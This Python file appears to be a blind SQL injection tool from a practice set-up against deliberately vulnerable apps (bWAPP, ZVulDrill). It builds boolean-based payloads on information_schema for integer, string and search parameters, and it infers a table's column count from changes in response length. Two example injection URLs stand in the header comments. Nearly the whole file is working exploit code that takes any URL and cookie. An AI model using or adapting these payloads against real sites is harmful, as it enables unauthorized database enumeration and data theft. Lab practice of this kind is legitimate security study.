# http://172.30.61.112/bWAPP/bWAPP/sqli_2.php?action=go&movie=100 or if((select ascii(substr((select count(*) from information_schema.columns where table_name=0x6D6F76696573),1,1)))=56,1,0)
# http://172.30.61.112/ZVulDrill-master/search.php?search=0'or if((select ascii(substr((select count(*) from information_schema.columns where table_name=0x61646D696E),1,1)))=51,1,0)%23

import urllib
from urllib import request
from data import glovar, glofun



def get_cocount(url=glovar.url3, cookie=False, type='search',
                tbname='admin'):
    response_length = 0


    hex_tbname=glofun.hex_convert(tbname)


    # 查数据库test中表的个数基础知识--这里的方法只使用与表的个数少于10的，要是多多于10的话substr(({sql}),2,1)要这样增加截取，或者substr(({sql}),1,2)
    if type == 'int':
        payload = '+or+if((select+count(*)+from+information_schema.columns+where+table_name=' + hex_tbname + ')={cocount},1,0)'
    elif type == 'string':
        payload = '\'+or+if((select+count(*)+from+information_schema.columns+where+table_name=' + hex_tbname + ')={cocount},1,0)%23'
    elif type == 'search':
        payload = '%\'+or+if((select+count(*)+from+information_schema.columns+where+table_name=' + hex_tbname + ')={cocount},1,0)%23'

    for i in range(0, 30):

        full_payload = url + payload.format(cocount=str(i))

        url_response = urllib.request.Request(full_payload)

        if cookie != False:
            url_response.add_header('Cookie', cookie)

        url_read = request.urlopen(url_response).read()

        if response_length > len(url_read):
            print("%s column count is %d" % (tbname, i - 1))
            break

        response_length = len(url_read)


if __name__ == "__main__":
    get_cocount(url=glovar.url4, cookie=glovar.cookie, type='int', tbname='1')
